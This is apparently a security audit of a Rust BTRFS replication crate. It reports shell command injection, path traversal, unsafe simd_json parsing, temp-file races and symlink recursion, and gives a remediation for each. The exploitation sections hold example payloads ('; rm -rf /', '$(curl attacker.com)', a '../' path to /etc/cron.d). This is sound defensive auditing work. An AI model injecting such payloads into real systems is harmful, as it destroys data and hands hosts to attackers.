# Production Security & Quality Audit: op-blockchain

## Architecture & Module Map

### Overview
`op-blockchain` is a control-plane storage and replication utility designed to maintain a dual-subvolume immutable audit trail (using BTRFS subvolumes: `timing`, `vectors`, and `state`) combined with NUMA node optimization and asynchronous replication via BTRFS send/receive. It targets high-throughput change tracking for system configurations and plugin states.

### Module Tree
```
crates/op-blockchain/src/
 ├── lib.rs (Crate Entry Point)
 ├── blockchain.rs (Core BTRFS-backed StreamingBlockchain)
 ├── streaming_blockchain.rs (Parallel/Divergent StreamingBlockchain with Vector streaming)
 ├── btrfs_numa_integration.rs (NUMA-aware OptimizedBlockchain cache wrapper)
 ├── footprint.rs (Current timing-authoritative BlockEvent & PluginFootprint types)
 ├── plugin_footprint.rs (Legacy footprint generator with heuristic/ML vectorization)
 ├── retention.rs (Rolling retention policy parser/enforcer)
 └── snapshot.rs (Snapshot interval configuration options)
```

### Entry Points
- **Library Entry Point**: `crates/op-blockchain/src/lib.rs`
- **Binary/Executable Targets**: None identified in this crate (managed at the workspace level).

### Architectural Notes & Risk Profile
- **Namespace Collision and Divergence**: The crate contains two parallel implementations of `StreamingBlockchain` (in `blockchain.rs` and `streaming_blockchain.rs`). They are divergent; `blockchain.rs` implements BTRFS failure degradation (falling back to standard directories), whereas `streaming_blockchain.rs` forces hard failures on non-BTRFS systems. Because `btrfs_numa_integration.rs` binds directly to `streaming_blockchain::StreamingBlockchain`, NUMA-aware storage paths will crash unconditionally on non-BTRFS nodes.
- **Privilege Escalation Risk**: This crate spawns processes executing native host commands (`btrfs subvolume ...`, `ssh ...`). Since BTRFS subvolume manipulation usually requires `CAP_SYS_ADMIN` or root privileges, the control plane is assumed to run with high privileges. Any command execution vulnerability here presents an immediate root privilege compromise.

---

## Security & Quality Findings

### [CRITICAL] Shell Command Injection via Unsanitized Remote Replicated Inputs
- **File**: `crates/op-blockchain/src/blockchain.rs` (Lines 269–275)
- **File**: `crates/op-blockchain/src/streaming_blockchain.rs` (Lines 480–488, 505–520)

#### Description
The replication and vector streaming functions construct shell commands via string interpolation and execute them under system shells (`sh -c` and `bash -c`). The arguments—including `remote_path`, `remote`, and individual items in `replicas`—are formatted directly into the command payload without sanitization, shell-escaping, or validation:

```rust
// crates/op-blockchain/src/blockchain.rs:
let output = Command::new("sh")
    .arg("-c")
    .arg(format!(
        "btrfs send {} | ssh {} 'btrfs receive {}'",
        snapshot_path.display(),
        remote_path,
        remote_path
    ))
```

And similarly in `streaming_blockchain.rs`:
```rust
// crates/op-blockchain/src/streaming_blockchain.rs:
let cmd = format!(
    "btrfs send {} | tee {} > /dev/null",
    vector_snapshot.display(),
    tee_args.join(" ")
);
```

#### Exploitation Vector
An attacker controlling the `remote` destination, a target `replica` IP/hostname string, or `remote_path` (for example, parsed from a malicious workspace configuration or dynamic DBus command) can inject command separators (e.g., `; rm -rf /` or `$(curl attacker.com)`) into the system call. Because the daemon runs with BTRFS administrative privileges (equivalent to root), this leads to absolute host compromise.

#### Remediation
1. Avoid executing shell interpreters (`sh`, `bash`) altogether. Spawning sub-processes should be done using structured execution.
2. Replace piped commands with programmatically managed `std::process::Stdio` pipes. Establish a direct `Command::new("btrfs")` with structured argument vector elements, and write the standard output stream of that process directly into the standard input stream of a structured `Command::new("ssh")` process.

---

### [CRITICAL] Arbitrary File Write & Path Traversal via Unvalidated Hashes
- **File**: `crates/op-blockchain/src/streaming_blockchain.rs` (Lines 242, 254)
- **File**: `crates/op-blockchain/src/btrfs_numa_integration.rs` (Line 160)

#### Description
When adding a new plugin footprint, the `event.hash` is bound directly to the user-supplied `footprint.content_hash`. The framework writes JSON audit blocks and binary vector frames to disk by joining the base directories with `event.hash` without performing path traversal checks:

```rust
// crates/op-blockchain/src/streaming_blockchain.rs:
let timing_file = self.timing_subvol.join(format!("{}.json", event.hash));
tokio::fs::write(&timing_file, ...).await?;
```

Similarly, when fetching cached blocks, the `block_hash` parameter is directly formatted into paths:
```rust
// crates/op-blockchain/src/btrfs_numa_integration.rs:
let block_file = cache_dir
    .join("blocks")
    .join("by-hash")
    .join(format!("{}.json", block_hash));
```

#### Exploitation Vector
Because `PluginFootprint` implements `serde::Deserialize` and is accepted over dynamic channels, an attacker can submit a footprint payload with a crafted `content_hash` containing parent-directory sequences (e.g., `../../../../etc/cron.d/malicious`). This forces the server to write an arbitrary `.json` file anywhere on the filesystem, allowing the attacker to establish persistent cron tasks or corrupt critical system state files.

#### Remediation
Before joining paths with any hash string derived from client inputs, validate that the hash matches an expected alphanumeric pattern (e.g., matching standard SHA-256 hex format `^[a-f0-9]{64}$`). Alternatively, explicitly reject any hash containing path separator characters (e.g., `/`, `\`).

---

### [HIGH] Undefined Behavior via Unsafe `simd_json::from_str` on Unpadded String Buffers
- **File**: `crates/op-blockchain/src/btrfs_numa_integration.rs` (Line 168)
- **File**: `crates/op-blockchain/src/blockchain.rs` (Line 217)
- **File**: `crates/op-blockchain/src/streaming_blockchain.rs` (Line 341)

#### Description
The application reads serialized JSON strings from disk and passes them to `simd_json::from_str` within `unsafe` blocks:

```rust
// crates/op-blockchain/src/btrfs_numa_integration.rs:
let mut data = tokio::fs::read_to_string(&block_file).await?;
let block_data: simd_json::OwnedValue = unsafe { simd_json::from_str(&mut data)? };
```

`simd_json`'s parser uses specialized SIMD instructions that read memory in blocks of 32 or 64 bytes. Consequently, the parser demands that input buffers have a matching padding allocation at the end (specifically `simd_json::PADDING` bytes) to prevent out-of-bounds reads. Standard `String` buffers populated by `tokio::fs::read_to_string` do not guarantee this padding or overallocated capacity, making direct invocations of `simd_json::from_str` on them a trigger for undefined behavior and memory protection faults.

#### Remediation
Utilize `simd_json::to_padded_copy` to safely allocate a padded buffer, or use the standard `from_slice` API with a properly padded mutable vector. For maximum safety and clarity:

```rust
let mut data = tokio::fs::read(&block_file).await?;
let block_data: simd_json::OwnedValue = simd_json::from_slice(&mut data)?;
```
*(Note: `simd_json::from_slice` is safe and enforces padding requirements programmatically).*

---

### [MEDIUM] Concurrency Race Conditions on Hardcoded Temp File Names
- **File**: `crates/op-blockchain/src/streaming_blockchain.rs` (Lines 311, 328)

#### Description
To achieve atomic writes, the methods `update_current_state` and `update_plugin_state` write state content to a hardcoded temporary file name prior to renaming it to the final target file:

```rust
// crates/op-blockchain/src/streaming_blockchain.rs:
let temp_file = self.state_subvol.join(".current.json.tmp");
tokio::fs::write(&temp_file, simd_json::to_string_pretty(state)?).await?;
tokio::fs::rename(&temp_file, &current_state_file).await?;
```

If multiple asynchronous tasks or multiple plugins invoke these update methods concurrently, they will write to the exact same static path (`.current.json.tmp` or `.{plugin_name}.json.tmp`).

#### Impact
This race condition causes concurrent execution threads to corrupt, overwrite, or delete intermediate state updates, resulting in inconsistent disaster-recovery configurations on disk.

#### Remediation
Incorporate a unique identifier (such as a UUID generated via `uuid::Uuid::new_v4()`) into the intermediate temporary filename:

```rust
let temp_file = self.state_subvol.join(format!(".current.json.{}.tmp", uuid::Uuid::new_v4()));
```

---

### [MEDIUM] Schema-As-Code Violations (Ad-hoc Struct Contracts)
- **File**: `crates/op-blockchain/src/footprint.rs` (Lines 10, 43)
- **File**: `crates/op-blockchain/src/plugin_footprint.rs` (Line 10)
- **File**: `crates/op-blockchain/src/retention.rs` (Line 10)

#### Description
This system’s architecture requires strict schema-as-code discipline, utilizing versioned Protocol Buffers and OSCAL profiles for security and contract stability. However, the `BlockEvent` and `PluginFootprint` structures bypass this pattern, modeling system change tracking payloads as ad-hoc Rust structs with generic JSON containers (`simd_json::OwnedValue`):

```rust
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct BlockEvent {
    pub timestamp: u64,
    pub category: String,
    pub action: String,
    pub data: simd_json::OwnedValue, // Ad-hoc schematic boundary
    pub hash: String,
    pub vector: Vec<f32>,
}
```

This prevents unified validation of state records, limits the interoperability of audit trails, and complicates backwards compatibility over upgrades.

#### Remediation
Re-declare all block events, transaction audit elements, and footprints as versioned Protocol Buffer schemas. Generate the matching Rust data structures via `prost-build` (which is already configured in the workspace) to guarantee consistent and robust binary and JSON schema validation.

---

### [LOW] Stack Overflow Vulnerability in `copy_dir_recursive` via Unchecked Symlinks
- **File**: `crates/op-blockchain/src/blockchain.rs` (Lines 488–505)

#### Description
The auxiliary utility `copy_dir_recursive` copies directory content by recursively calling itself whenever a directory file type is encountered. It fails to check if the directory entry is a symbolic link before recursing:

```rust
if entry.file_type().await?.is_dir() {
    Box::pin(copy_dir_recursive(&src_path, &dst_path)).await?;
}
```

#### Impact
If an attacker introduces a directory symbolic link pointing back to a parent directory (a circular symlink), executing a backup or state copy will cause infinite recursion, quickly exhausting the call stack and crashing the daemon.

#### Remediation
Ensure that the directory copy operation explicitly ignores symbolic links or handles them specifically. Check `entry.file_type().await?.is_symlink()` and reject or skip symlinks to preserve recursion limits.